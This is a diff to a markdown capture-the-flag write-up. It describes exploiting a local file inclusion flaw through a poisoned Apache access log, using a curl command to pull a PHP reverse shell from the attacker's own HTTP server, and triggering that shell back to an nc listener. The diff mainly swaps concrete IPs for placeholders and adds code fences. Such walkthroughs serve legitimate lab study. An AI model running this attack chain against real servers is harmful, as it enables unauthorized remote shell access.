@@ -319,12 +319,15 @@ User www-data may run the following commands on 42905e333fcc:
 -> It works !!!
 
 + So we run 'curl' to put the revershell.php into the server.
-+ Run "http://10.10.117.90/index.php?view=cat/../../../../../var/log/apache2/access.log&ext&cmd=curl http://10.11.101.46/Documents/revershell.php -o revershell.php"
++ Run "http://<IP>/index.php?view=cat/../../../../../var/log/apache2/access.log&ext&cmd=curl http://<IP>/Documents/revershell.php -o revershell.php"
 + When we open local server by 'python3 -m http.server':
+  ```bash
 	Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 	10.10.117.90 - - [09/Sep/2024 20:14:20] "GET /Documents/revershell.php HTTP/1.1" 200 -
+```
 
 + Check in server:
+``bash
 	10.11.101.46 - - [09/Sep/2024:11:50:05 +0000] "GET / HTTP/1.1" 200 615 "-" "cat.php
 	cats
 	dog.php
@@ -334,6 +337,7 @@ User www-data may run the following commands on 42905e333fcc:
 	revershell.php
 	style.css
 	"
+```
 + Now run the revershell.php to nc listner:
 	"<IP>/revershell.php"
 	---------------------
